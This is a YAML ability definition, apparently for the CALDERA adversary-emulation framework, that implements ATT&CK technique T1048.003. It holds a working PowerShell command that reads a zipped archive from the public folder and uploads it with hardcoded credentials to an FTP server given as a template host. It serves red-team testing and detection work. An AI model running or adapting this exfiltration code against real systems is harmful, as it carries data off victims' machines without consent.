- privilege: ''
  plugin: ''
  delete_payload: true
  technique_id: T1048.003
  additional_info: {}
  technique_name: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
  repeatable: false
  tactic: exfiltration
  requirements: []
  description: This abilities copy a file to the CALDREA's FTP server
  executors:
  - platform: windows
    cleanup: []
    variations: []
    timeout: 60
    additional_info: {}
    name: psh
    payloads: []
    language: null
    uploads: []
    parsers: []
    code: null
    build_target: null
    command: '
      $Username = "caldera_user";\n
      $Password = "caldera";\n
      $Ftp = "ftp://#{server}";\n
      $FtpPort = "2222";\n
      $ArchiveName = "data.zip";\n
      $LocalStorageDir = "$env:PUBLIC";\n
      $slash = "/";\n
      $AntiSlash = "\";\n
      $Column = ":";\n
      $FullPathArchive = "$LocalStorageDir$AntiSlash$ArchiveName";\n
      $RemoteFileName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-$ArchiveName";\n
      $FtpUri = $Ftp + $Column + $FtpPort + $Slash + $RemoteFileName;\n
      $Uri=[system.URI] $FtpUri;\n
      $FtpUpload = [System.Net.FtpWebRequest]::Create("$FtpUri");\n
      $FtpUpload = [System.Net.FTPWebRequest]$FtpUpload;\n
      $FtpUpload.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;\n
      $FtpUpload.Credentials = New-Object System.Net.NetworkCredential($Username,$Password);\n
      $FtpUpload.UseBinary = $true;\n
      $FtpUpload.UsePassive = $true;\n
      $FileContent = gc -encoding Byte $FullPathArchive;\n
      $FtpUpload.ContentLength = $FileContent.Length;\n
      $Run = $FtpUpload.GetRequestStream();\n
      $Run.Write($FileContent, 0, $FileContent.Length);\n
      $Run.Close();\n
      $Run.Dispose();\n
      '
  singleton: true
  buckets: []
  name: copy compressed archive to ftp server
  access: {}
  id: ftp_archive_exfiltration
